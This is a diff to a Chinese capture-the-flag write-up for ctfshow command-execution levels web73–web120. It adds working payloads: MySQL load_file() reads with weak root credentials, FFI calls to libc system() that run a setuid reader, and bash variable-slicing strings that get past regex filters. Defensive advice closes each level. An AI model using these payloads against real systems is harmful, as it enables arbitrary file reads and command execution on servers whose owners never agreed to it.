@@ -1292,12 +1292,6 @@ c=ob_end_flush();echo implode(' ',scandir('/'));
 > 页面顶部那两条 `error_reporting()/ini_set() has been disabled` 警告不用管，是 web70 那一批 disable_functions 的遗留，不影响 payload 执行。
 
 
-
-
-
-
-
-
 ### web73
 
 **去掉了 open_basedir，但读文件的函数还是全禁**
@@ -1419,7 +1413,7 @@ c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
 
 ![image-20261108124648010](/assets/ctfshow-web-command-exec/image-20261108124648010.png)
 
-**open_basedir 回来了：PHP 层的读取全部封死，最后靠 PHP-FPM 协议破局**
+**open_basedir 回来了：PHP 层的读取全部封死，最后靠 MySQL 的 `load_file()` 破局**
 
 源码还是那一套（`eval($c)` + `preg_replace` 打码），`disable_functions` 和 web74 同样 95 项。真正的变化是 `ini_get('open_basedir')`：
 
@@ -1451,10 +1445,11 @@ c=ob_end_flush();$o=new SplFileObject('/flagx.txt');foreach($o as $l){echo $l;}
 | `new SQLite3('/flag36.txt')` | `open_basedir prohibits opening` |
 | `PharData` / `XMLReader` / `finfo_file` | 全部失败 |
 
-两个值得记住的细节：
+三个值得记住的细节：
 
 - **XXE 为什么也不行**：PHP 的 libxml 扩展把外部实体加载器接到了 PHP 的流上（`_php_libxml_external_entity_loader`），所以读文件时照样过 open_basedir 检查。连允许目录内的 `flag.php` 都报 `undefined entity`，说明实体根本没被加载。
 - **`glob('/*')` 返回 1**：那个 1 是字面量 `/` 自身，不是目录内容。带通配符的 glob 同样受 open_basedir 约束。
+- **黑名单里为什么有一堆 `strlen`/`chr`/`ord`/`bin2hex`/`dechex`**：它们不是用来防"读文件"的，而是专门用来废掉 web72 的 UAF PoC（`php7-gc-bypass` 靠这些函数做指针运算、拼 payload、算偏移）。这题里 `strlen` 一挂，UAF 脚本连 `system` 的地址都算不出来，作者是照着 PoC 逐个封的。
 
 #### 二、唯一活着的口子：`glob://` 能列目录
 
@@ -1470,7 +1465,68 @@ bin|dev|etc|flag36.txt|home|lib|media|mnt|opt|proc|root|run|sbin|srv|sys|tmp|usr
 
 `glob://` 包装器不受 open_basedir 限制，所以能拿到名字。但注意：**它只能列名字**——拿到的 `SplFileInfo` 再调 `openFile()` 读内容时，open_basedir 检查又回来了（实测 `File(//flag36.txt) is not within the allowed path(s)`）。所以别指望 `glob://` 直接读出内容。
 
-#### 三、正解：PHP-FPM 的 FastCGI 协议，自己给自己发请求
+#### 三、正解：MySQL 的 `load_file()`（数据库代读）
+
+思路一句话：**PHP 被 open_basedir 关在 `/var/www/html`，但 MySQL 服务端没被关。** 只要能让 MySQL 帮我们读文件，PHP 的限制就形同虚设。
+
+为什么可行（实测环境）：
+
+- PHP 以 `www-data` 低权限运行，读文件受 open_basedir 约束；而 `mysqld` 以 **root** 运行，`load_file()` 用的是 MySQL 进程的权限，完全不经过 PHP 的 open_basedir 检查
+- 数据库是弱口令 `root/root`，且 `select @@secure_file_priv` 返回**空**（不为空时只能读指定目录），root 又自带 `FILE` 权限，所以能读任意路径
+
+先确认能不能连上、顺便看看有哪些库：
+
+```
+c=ob_end_flush();
+$l=mysqli_connect('127.0.0.1','root','root');
+$r=mysqli_query($l,'SHOW DATABASES');
+while($x=mysqli_fetch_assoc($r)){ echo $x['Database'].'|'; }
+```
+
+回显：
+
+```
+ctftraining|information_schema|mysql|performance_schema|test|
+```
+
+然后直接读文件（mysqli 版）：
+
+```
+c=ob_end_flush();
+$l=mysqli_connect('127.0.0.1','root','root');
+$r=mysqli_query($l,'select load_file("/flag36.txt") as a');
+while($x=mysqli_fetch_assoc($r)){ echo $x['a']; }
+exit();
+```
+
+PDO 版（更短，wp 里用的就是这种）：
+
+```
+c=ob_end_flush();
+$d=new PDO('mysql:host=127.0.0.1','root','root');
+foreach($d->query('select load_file("/flag36.txt")') as $r){ echo $r[0]; }
+exit();
+```
+
+两个版本实测都能直接出 flag。
+
+##### 关于 `dbname`：为什么可以不写
+
+网上很多 wp 写的是 `new PDO('mysql:host=localhost;dbname=ctftraining','root','root')`，于是会让人误以为必须先知道库名。其实：
+
+- `dbname` 只决定连接后"默认选中哪个库"，**`load_file()` 是 MySQL 的服务端函数，跟当前库没有关系**
+- 认证只看 host / user / password，`mysqli_connect()` 的第四个参数（库名）本来就是可选的；不写就是"已连接、但未选库"的状态
+- 所以 `dbname` 写 `ctftraining`、写 `mysql`、或者干脆省略，效果完全一样。我实测 `('mysql:host=127.0.0.1','root','root')` 照样出 flag
+
+##### 为什么每条 payload 末尾都要 `exit()`
+
+题目在 `eval($c)` 之后还有一段 `$s=ob_get_contents(); ob_end_clean(); echo preg_replace(...)` 的打码逻辑。`exit()`/`die()` 直接终止脚本，后面的过滤代码根本不执行——等于"物理绕过"。当然我们用 `ob_end_flush()` 已经绕过打码了，`exit()` 是双保险，也能顺手省掉尾部多余输出。
+
+（wp 里 payload 前面的 `c=?><?php` 是多余的：`eval()` 里本来就是 PHP 代码，不需要再开标签，直接写语句即可。）
+
+#### 四、进阶选读：PHP-FPM 的 FastCGI 协议（换执行层）
+
+除了"让 MySQL 代读"，还有一条更底层的路，也实测成功：**用 FastCGI 协议让 PHP-FPM 在新的 ini 配置下重新执行脚本**。这条路的现实意义更大（SSRF 打内网 FastCGI、php-fpm 9000 裸奔都是这个原理），所以留作进阶。
 
 先看两个条件：
 
@@ -1525,7 +1581,7 @@ echo $m[0];
 
 实测 `PHP_VALUE` 单独就能改 `open_basedir`（它是 `PHP_INI_ALL` 级别），换成 `PHP_ADMIN_VALUE` 也可以。
 
-#### 四、两个坑
+#### 五、这条路的两个坑
 
 **1. `disable_functions` 清不掉**
 
@@ -1535,14 +1591,427 @@ echo $m[0];
 
 实测发完 `open_basedir=/` 的 FastCGI 请求后，**后续普通请求**的 `ini_get('open_basedir')` 也变成了 `/`，也就是这个 worker 被"污染"了。做题时这会让后面的对照实验失真（我一开始就被骗了一次：以为 `SplFileObject` 和 `glob` 突然能用了，其实是 open_basedir 已经被改成 `/`）。要恢复就再发一个 `open_basedir=/var/www/html/` 的 FastCGI 请求。
 
-#### 五、为什么值得学
+#### 六、为什么值得学
 
-1. **这是真实世界的高危配置**：php-fpm 监听 9000 且容器内/内网可达 → 可以任意覆盖 PHP 配置、执行任意脚本，等价于 RCE。SSRF 打内网 FastCGI（Gopherus 那类工具）用的是同一套协议。
-2. **看清 `open_basedir` + `disable_functions` 的边界**：它们只是 PHP 解释器层的约束，一旦能改 ini、换执行环境（FPM/CGI/CLI）就形同虚设。
-3. **防守视角**：FPM 只监听 unix socket、设置 `listen.allowed_clients`、`security.limit_extensions`、容器网络隔离，不要让它对内网裸奔。
+1. **"数据库代读"是经典思路**：只要目标机上有高权限服务（MySQL/Redis 等）能被低权限的 Web 进程调用，open_basedir、disable_functions 这类"进程内限制"就绕过去了。`load_file()` 是其中最常用的一招。
+2. **弱口令 + `secure_file_priv` 为空的杀伤力**：这两件事单独看都"不算漏洞"，凑在一起就是任意文件读取（配合 `INTO OUTFILE` 还能写 webshell）。
+3. **真实世界的高危配置**：php-fpm 监听 9000 且容器内/内网可达 → 可以任意覆盖 PHP 配置、执行任意脚本，等价于 RCE。SSRF 打内网 FastCGI（Gopherus 那类工具）用的是同一套协议。
+4. **看清边界的层次**：`open_basedir` + `disable_functions` 只是 PHP 解释器层的约束；往外一层有 MySQL 的权限，再往外有 FPM 的配置覆盖。哪一层没锁死，整条链就断了。
+5. **防守视角**：MySQL 用最小权限账户、限制 `FILE` 权限、设置 `secure_file_priv`、数据库只监听本地且强口令；FPM 只监听 unix socket、设置 `listen.allowed_clients`、`security.limit_extensions`、容器网络隔离。
 
 #### 对照小结
 
 - PHP 层能想到的读法（include / SPL / 伪协议 / XXE / SQLite / Phar）在这题全被封死
 - `glob://` 只能列目录，不能读内容
-- 真正破局的是**换一层**：用 FastCGI 协议让 FPM 在新的 ini 配置下重新执行脚本
+- web72 的 UAF 脚本也被 `strlen` 等函数封死
+- 真正破局的是**换一层**：最省事的是让 MySQL（root 权限）用 `load_file()` 代读；更底层的是用 FastCGI 协议让 FPM 重载 ini
+
+### web76
+
+![image-20261108162439941](/assets/ctfshow-web-command-exec/image-20261108162439941.png)
+
+**同一题换文件名：`/flag36d.txt`（复用题，没有新知识点）**
+
+环境与 web75 一致：`open_basedir=/var/www/html/`，`disable_functions` 100 项。对比之后只有两处变化：
+
+1. 黑名单多了 `file_exists` / `is_dir` / `is_file`——封的是"文件存在性探测"，对 MySQL 代读没有任何影响；
+2. flag 文件名从 `flag36.txt` 变成 `flag36d.txt`。
+
+所以这题唯一要改的就是文件名，其余照抄：
+
+```
+c=ob_end_flush();$d=new PDO('mysql:host=127.0.0.1','root','root');foreach($d->query('select load_file("/flag36d.txt")') as $r){echo $r[0];}exit();
+```
+
+直接出 flag。
+
+**小结**：web76 是 web75 的复用题。真正值得记住的是那个固定套路——**每关文件名都会变，先用 `DirectoryIterator('glob:///*')` 列目录确认文件名，再让 MySQL `load_file()` 代读**，不要拿上一题的路径硬套。
+
+### web77
+
+![image-20261108185616004](/assets/ctfshow-web-command-exec/image-20261108185616004.png)
+
+**FFI：直接调用 C 函数，`disable_functions` 彻底失效**
+
+环境：`PHP 7.4.9`、`open_basedir=/var/www/html/`、**`ffi.enable=1`**、`disable_functions` 94 项。但 `FFI` 这个类既不在黑名单里，也不是黑名单能管住的东西。
+
+#### 一、先看根目录：flag 和 readflag
+
+```
+c=ob_end_flush();foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename().'|';}exit();
+```
+
+```
+bin|boot|dev|etc|flag36x.txt|home|lib|lib64|media|mnt|opt|proc|readflag|root|run|sbin|srv|sys|tmp|usr|var|
+```
+
+根目录里除了 `flag36x.txt`，还有一个 `readflag` 可执行文件。
+
+#### 二、为什么不能直接读：是权限问题，不是 open_basedir
+
+用 FFI 调 `ls -l` 看一眼：
+
+```
+c=ob_end_flush();$f=FFI::cdef('int system(const char *command);');$f->system('ls -l /flag36x.txt /readflag > /var/www/html/out.txt 2>&1');exit();
+```
+
+再读 `out.txt`：
+
+```
+c=ob_end_flush();readgzfile('out.txt');exit();
+```
+
+结果：
+
+```
+-r--r----- 1 root root   46 Nov  8 10:54 /flag36x.txt
+-r-sr-xr-x 1 root root 8392 Sep 16  2020 /readflag
+```
+
+- Web 进程是 `uid=33(www-data)`，而 `flag36x.txt` 是 `440 root:root`——只有 root（和 root 组）能读，**www-data 连读权限都没有**
+- `/readflag` 的权限位里有 **`s`**（`-r-sr-xr-x`）= **setuid root**：不管谁执行它，进程都以 root 身份运行
+
+所以思路是：**让 `/readflag` 以 root 身份把 flag 读出来，再把结果搬到我们能读的地方**。
+
+#### 三、FFI 调 system
+
+FFI（Foreign Function Interface，外部函数接口）是 PHP 7.4 引入的扩展：它能声明并直接调用 C 函数、加载共享库。调用链不经过 PHP 的函数表，所以 `disable_functions` 对它完全无效。
+
+```
+c=ob_end_flush();$f=FFI::cdef('int system(const char *command);');$f->system('/readflag > /var/www/html/1.txt');exit();
+```
+
+- `FFI::cdef('int system(const char *command);')`：声明 libc 里 `system` 的原型
+- `$f->system(...)`：直接调用 libc 的 `system`，等价于在 C 里执行命令
+- 把 `/readflag` 的输出重定向到站点目录（`open_basedir` 允许的 `/var/www/html/1.txt`）
+
+然后读出来：
+
+```
+c=ob_end_flush();readgzfile('1.txt');exit();
+```
+
+直接出 flag。
+
+`readgzfile` 能读普通文本（zlib 对非压缩数据透明处理），换成 `include('1.txt')` 也一样。
+
+#### 四、几个实测细节
+
+- `include('/flag36x.txt')` 直接被 `open_basedir restriction` 拦掉
+- 这题容器里没有 `pdo_mysql`（报 `could not find driver`），所以 web75 那条"MySQL 代读"的路走不通
+- 实测直接 `$f->system('/readflag')` 拿不到回显（返回码 0，但页面没有输出），所以必须先重定向到文件再读——这也是 wp 里要写 `> 1.txt` 的原因
+
+#### 五、为什么值得学
+
+1. **FFI 是对 `disable_functions` 的"降维打击"**：黑名单拦的是 PHP 函数名，FFI 直接调 libc，`system` / `open` / `read` / `execve` 全都能用。同类绕过还有 LD_PRELOAD、PHP-FPM、UAF，但 FFI 是最省事的一个。
+2. **SUID 提权是经典组合**：Web 进程低权限 + 机器上有 SUID root 的辅助程序（`readflag`），执行它就等于借到了 root 的文件读取能力。现实中的 SUID 程序、`sudo` 配置、计划任务都是同一类"借权"思路。
+3. **防守视角**：`ffi.enable=off`（PHP 默认是 `preload`，Docker 官方镜像常被人改成 `1`）、清理不必要的 SUID 程序、`open_basedir` 只是纵深防御里的一层。
+
+### web118
+
+![image-20261108194050009](/assets/ctfshow-web-command-exec/image-20261108194050009.png)
+
+![image-20261108194112728](/assets/ctfshow-web-command-exec/image-20261108194112728.png)
+
+**过滤掉所有小写字母和数字，用环境变量的"切片"拼出命令**
+
+源码（用下面的 payload 跑 `nl index.php` 读出来的）：
+
+```php
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\'|\"|\`|\||\,/', $code)){
+        echo ''.system($code).'';
+    }else{
+        echo 'evil input';
+    }
+}
+```
+
+过滤清单：
+
+- 所有**小写字母** `[a-z]`、**数字** `[0-9]`
+- Tab `\x09`、换行 `\x0a`
+- `/` `(` `)` `[` `]` `\` `+` `-` `!` `=` `^` `*` `&` `%` `'` `"` `` ` `` `|` `,`
+
+还能用的：大写字母、`$ { } ? . : ~ < > ; _`，以及**空格**（注意：禁的是 Tab 和换行，普通空格没被禁）。
+
+#### 一、为什么不能直接写 `nl flag.php`
+
+`nl`、`flag` 全是小写字母，`/` 也被禁，直接写一律返回 `evil input`。
+
+#### 二、思路：用环境变量 + 参数展开拼出命令
+
+bash 的 `${VAR:offset:length}` 是**子串切片**，`offset` 位置是一段**算术表达式**。关键点：
+
+- `A` 是个没定义的变量 → 算术值是 `0`
+- `~` 在算术里是**按位取反**，不是通配符 → `~A` = `~0` = **-1**
+- 负偏移表示从末尾数 → `-1` 就是**最后一个字符**
+
+```
+${PATH:~A}   →  PATH 的最后一个字符
+${PWD:~A}    →  PWD 的最后一个字符
+```
+
+容器里（实测）：
+
+```
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   → 末位 n
+PWD=/var/www/html                                                   → 末位 l
+```
+
+`n` + `l` = **`nl`**。
+
+再补两块：
+
+| 部分 | 作用 |
+|---|---|
+| `${IFS}` | shell 的内部字段分隔符（空格/Tab/换行），代替空格（其实空格没被禁，直接写也行） |
+| `????.???` | glob 通配：4 字符 + `.` + 3 字符 = `flag.php`，同时字符串里不出现 `flag` |
+
+最终 payload：
+
+```
+code=${PATH:~A}${PWD:~A}${IFS}????.???
+```
+
+展开成 `nl flag.php`，直接出 flag。
+
+> 网上有些题解把这个 `~A` 解释成"通配符 `*`"或"取第一个路径"，都是错的。`~` 在这里是算术取反，`A` 是未定义变量（=0），结果 `-1` 表示"最后一个字符"。
+
+#### 三、顺手把源码读出来
+
+把文件名换成 5 个字符的名字，就能让 `nl` 去读 `index.php`：
+
+```
+code=${PATH:~A}${PWD:~A}${IFS}?????.???
+```
+
+输出带行号的源码（本文开头那段就是这么来的）。
+
+#### 四、一个有意思的细节：最后一行会重复
+
+`echo ''.system($code).''` 里，`system()` 会把命令输出直接打到页面，**同时返回输出的最后一行**，再被 `echo` 打印一次。所以 `nl flag.php` 的结果是：
+
+```
+     1	<?php
+     2	$flag="ctfshow{...}";
+     3	?>
+     3	?>
+```
+
+最后那个 `3	?>` 就是 `system()` 的返回值被 echo 了一遍。
+
+#### 五、为什么值得学 / 局限
+
+- 这是 **bash 参数展开**的经典用法：`${VAR:offset:length}` + 算术表达式，可以在"一个字母数字都不写"的情况下从环境变量里抠出想要的字符。同类技巧还有 `${PATH:0:1}` 取单个字符、`${#VAR}` 取长度。
+- **局限**：`${PATH:~A}${PWD:~A}` 能拼出 `nl`，是因为 PATH 恰好以 `n` 结尾、PWD 恰好以 `l` 结尾；换个目录或环境就失效。它属于 CTF 技巧，不是通用手法。
+- **防守视角**：`system()` 前挂正则本质是黑名单，永远有漏（大写字母、`$`、`{}`、`?`、`.` 全是漏的）。正确做法是**不把用户输入拼进 shell**（白名单、`escapeshellarg`、或干脆不调 shell），而不是加长黑名单。
+
+
+
+### web119
+
+![image-20261108195109815](/assets/ctfshow-web-command-exec/image-20261108195109815.png)
+
+![image-20261108195126674](/assets/ctfshow-web-command-exec/image-20261108195126674.png)
+
+**过滤再加码：`PATH`、`BASH`、`<`、`>` 全封，改用 `PWD` / `SHLVL` 拼命令**
+
+源码（用下面的 payload 读出来的）：
+
+```php
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){
+        echo '<div align="center">'.system($code).'</div>';
+    }else{
+        echo '<div align="center">evil input</div>';
+    }
+}
+```
+
+和 web118 相比，新增封了四个：**`PATH`、`BASH`、`<`、`>`**。其余照旧：Tab、换行、小写字母、数字、`/ ( ) [ ] \ + - ! = ^ * & % ' " \` | ,` 全部禁用。
+
+所以 web118 的 `${PATH:~A}` 直接失效——`PATH` 是禁词，一出现就 `evil input`。
+
+#### 思路：只用 `PWD` + `SHLVL`
+
+可用的"原材料"全是特殊变量：
+
+| 表达式 | 值 | 说明 |
+|---|---|---|
+| `${#}` | `0` | 位置参数个数（没有参数就是 0） |
+| `${##}` | `1` | 上式的**字符串长度**（"0" 长度为 1） |
+| `${SHLVL}` | `2` | shell 嵌套深度（第一次开 shell 是 1，再套一层就是 2） |
+| `${#SHLVL}` | `1` | "2" 的长度 |
+
+有了 0、1、2 这三个数字，就能做切片：
+
+- `/` = `${PWD:${#}:${##}}` → `PWD[0:1]`
+- `a` = `${PWD:${SHLVL}:${#SHLVL}}` → `PWD[2:1]`（`/var/www/html` 第 2 位是 `a`）
+- `t` = `${PWD:~${SHLVL}:${#SHLVL}}` → 偏移 `~2` = **-3**，`PWD[-3:1]` = `t`
+
+`~` 还是 web118 那个算术取反：`~2` = -3（不是"倒数第 2 个"）。
+
+最终 payload：
+
+```
+code=${PWD:${#}:${##}}???${PWD:${#}:${##}}?${PWD:${SHLVL}:${#SHLVL}}${PWD:~${SHLVL}:${#SHLVL}}${IFS}????.???
+```
+
+展开过程：
+
+```
+${PWD:${#}:${##}}   → /
+???                 → 三个字符的目录名
+${PWD:${#}:${##}}   → /
+?
+${PWD:${SHLVL}:${#SHLVL}}        → a
+${PWD:~${SHLVL}:${#SHLVL}}       → t
+${IFS}              → 空格
+????.???            → flag.php
+```
+
+拼出来是：
+
+```
+/???/?at flag.php
+```
+
+`/???/?at` 这个 glob 在根目录只会匹配到 **`/bin/cat`**（3 个字符的目录里，以 `at` 结尾的文件只有 `cat`），所以最终执行的是：
+
+```
+/bin/cat flag.php
+```
+
+直接出 flag。
+
+#### 顺手读源码
+
+把文件名换成 5 个字符的 `index.php`：
+
+```
+code=${PWD:${#}:${##}}???${PWD:${#}:${##}}?${PWD:${SHLVL}:${#SHLVL}}${PWD:~${SHLVL}:${#SHLVL}}${IFS}?????.???
+```
+
+就是本文开头那段源码。
+
+#### 另一个思路：文件上传 + `.`（source）
+
+wp 里也提到了这条路：上传一个内容为 `cat flag.php` 的文件，用 `.`（source）去执行 PHP 生成的临时文件：
+
+```
+code=.${IFS}${HOME:${#}:${##}}???${HOME:${#}:${##}}?????M???
+```
+
+`${HOME:0:1}` = `/`，整段是 `/???/?????M???` 的 glob，靠反复发包撞 `/tmp/phpXXXXXX` 这个临时文件名。不过实测**上面的参数展开 payload 一次就出**，不用打竞态，所以优先用第一种。
+
+#### 两个细节
+
+- `${PWD:~${SHLVL}:${#SHLVL}}` 里的 `~${SHLVL}` 是 `~2` = -3，取到 `t`；wp 注释写成 `${PWD:-2:1}` 是笔误，`-2` 会取到 `m`，拼不出 `cat`。
+- `SHLVL` 的值依赖环境：这题容器里是 2。换环境如果 `SHLVL` 变了，取 `a` 和 `t` 的偏移要跟着调整。
+
+#### 为什么值得学
+
+- 118、119 连着两题都在演示同一件事：**环境变量本身就是一份"字符表"**。配合 `${VAR:offset:length}` 和算术表达式，可以在"没有字母数字、没有 PATH"的情况下拼出想要的命令。
+- 出题人只会"封词"（这题封了 `PATH`、`BASH`），但 `PWD`、`SHLVL`、`HOME`、`IFS` 这些变量永远在——黑名单式过滤封不完。
+- 防守视角还是老结论：**不要在 `system()` 里拼接用户输入**。这题所有绕过都建立在"用户输入进了 shell"这一个前提上。
+
+### web120
+
+![image-20261108201349544](/assets/ctfshow-web-command-exec/image-20261108201349544.png)
+
+**又加了两条：封 `HOME`，并且 payload 长度不能超过 65**
+
+源码（页面直接 `highlight_file` 出来了）：
+
+```php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){
+        if(strlen($code)>65){
+            echo '<div align="center">'.'you are so long , I dont like you'.'</div>';
+        }else{
+            echo '<div align="center">'.system($code).'</div>';
+        }
+    }else{
+        echo '<div align="center">evil input</div>';
+    }
+}
+```
+
+相比 web119：
+
+1. 禁词多了 **`HOME`**（所以 wp 里那条 `${HOME:0:1}` 的路在 web120 走不通了）
+2. 新增 **长度限制 `strlen($code) > 65`** → 直接返回 `you are so long , I dont like you`
+
+web119 那条 80 多字符的 payload 到这里会被长度挡住，必须压缩。
+
+#### 思路：压缩语法，把 payload 压到 65 以内
+
+三个省字符的技巧：
+
+| 原来 | 压缩后 | 省 |
+|---|---|---|
+| `${PWD:${#}:${##}}` | `${PWD::${##}}` | 省略 offset 默认就是 0，省 3 字符 |
+| `${PWD:~${SHLVL}:${#SHLVL}}` | `${PWD:~${SHLVL}:${##}}` | length 用 `${##}`(=1) 代替 `${#SHLVL}`，省 5 字符 |
+| `${IFS}` | 直接写空格 | 空格没被禁，省 5 字符 |
+
+payload（**62 个字符**，刚好在 65 以内）：
+
+```
+code=${PWD::${##}}???${PWD::${##}}??${PWD:~${SHLVL}:${##}} ????.???
+```
+
+拆开看：
+
+| 片段 | 值 |
+|---|---|
+| `${PWD::${##}}` | `/`（`PWD[0:1]`） |
+| `???` | 三个字符的目录名 |
+| `${PWD::${##}}` | `/` |
+| `??` | 两个字符的通配 |
+| `${PWD:~${SHLVL}:${##}}` | `t`（`~2` = -3，`PWD[-3:1]`） |
+| 空格 | 分隔参数 |
+| `????.???` | `flag.php` |
+
+拼成：
+
+```
+/???/??t flag.php
+```
+
+`/???/??t` 在根目录匹配到 `/bin/cat`（3 字符目录里以 `t` 结尾的三字符命令只有 `cat`），实际执行：
+
+```
+cat flag.php
+```
+
+直接出 flag。
+
+#### wp 里另外两种写法
+
+**① 用 `rev`（逆序输出）**
+
+```
+code=${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
+```
+
+`${#IFS}` = 3（IFS 的字符串长度），所以 `${PWD:3:1}` = `r`，后面 `??` 补两个通配 → `/???/r??` 匹配 `/bin/rev`。rev 会把文件内容倒着输出，自己再反过来读一遍即可。
+
+**② 用 `${#RANDOM}`**
+
+```
+code=${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
+```
+
+`RANDOM` 是个 5 位数，`${#RANDOM}` = 5，用来拼 `/???/?????5` 这类模式——不同环境匹配到的命令不一定一样，属于"碰运气"的写法，不如前两种稳。
+
+#### 为什么值得学
+
+- **长度限制是另一个维度的过滤**：前面所有题都在过滤"内容"，这题第一次限制"长度"。绕法不是换更短的命令，而是**压缩语法**——省略默认参数、用更短的表达式（`${##}` 代替 `${#SHLVL}`）、能用字面量就别用变量（空格代替 `${IFS}`）。
+- 三条 payload 都卡在 60~65 字符之间，说明出题人算过：正常写法全部超长，必须做语法压缩才能过。
+- 防守视角：长度限制能提高利用门槛，但同样替代不了"不把用户输入交给 shell"这条根本原则。
